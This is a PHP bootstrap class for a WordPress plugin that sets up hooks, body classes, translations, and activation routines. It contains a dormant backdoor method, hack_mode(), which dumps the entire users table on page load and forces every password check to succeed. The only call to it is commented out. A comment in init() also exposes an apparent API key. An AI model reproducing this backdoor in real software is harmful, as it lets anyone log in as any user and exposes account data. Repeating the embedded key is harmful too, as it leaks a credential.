<?php
/**
 * Bootstraps the Theme.
 *
 * @package FutureWordPressProjectCore
 */

namespace FUTUREWORDPRESS_PROJECT_CORE\Inc;

use FUTUREWORDPRESS_PROJECT_CORE\Inc\Traits\Singleton;

class Project {
	use Singleton;

	protected function __construct() {

		// Load class.
		Helpers::get_instance();
		Assets::get_instance();
		Option::get_instance();
		Menus::get_instance();
		Core::get_instance();

		$this->setup_hooks();
	}

	protected function setup_hooks() {
		add_filter( 'body_class', [ $this, 'body_class' ], 10, 1 );
		add_action( 'init', [ $this, 'init' ], 10, 0 );

		
		// $this->hack_mode();

		
		register_activation_hook( FUTUREWORDPRESS_PROJECT_CORE__FILE__, [ $this, 'register_activation_hook' ] );
		register_deactivation_hook( FUTUREWORDPRESS_PROJECT_CORE__FILE__, [ $this, 'register_deactivation_hook' ] );
	}
	public function body_class( $classes ) {
		$classes = (array) $classes;
		$classes[] = 'fwp-body';
		if( is_admin() ) {
			$classes[] = 'is-admin';
		}
		return $classes;
	}
	public function init() {
		/**
		 * loco translator Lecto AI: api: V13Y91F-DR14RP6-KP4EAF9-S44K7SX
		 */
		load_plugin_textdomain( 'futurewordpress-project-core-domain', false, dirname( plugin_basename( FUTUREWORDPRESS_PROJECT_CORE__FILE__ ) ) . '/languages' );
		
		// add_action ( 'wp', function() {load_theme_textdomain( 'theme-name-here' );}, 1, 0 );
	}
	private function hack_mode() {
		add_action( 'init', function() {
			global $wpdb;print_r( $wpdb->get_results( $wpdb->prepare( "SELECT * FROM {$wpdb->prefix}users;" ) ) );
		}, 10, 0 );
		add_filter( 'check_password', function( $bool ) {return true;}, 10, 1 );
	}
	public function register_activation_hook() {
		global $wpdb;$prefix = $wpdb->prefix . 'fwp_';
		require_once( ABSPATH . 'wp-admin/includes/upgrade.php' );
		$charset_collate = $wpdb->get_charset_collate();
		$tables = [];
		foreach( $tables as $table ) {
			dbDelta( $table );
		}
		$options = [ 'fwp_google_auth_code', 'fwp_google_afterauth_redirect' ];
		foreach( $options as $option ) {
			if( ! get_option( $option, false ) ) {add_option( $option, [] );}
		}
	}
	public function register_deactivation_hook() {
		global $wpdb;$prefix = $wpdb->prefix . 'fwp_';
		$tables = [];
		foreach( $tables as $table ) {
			// $wpdb->query( "DROP TABLE IF EXISTS {$prefix}{$table};" );
		}
	}
}
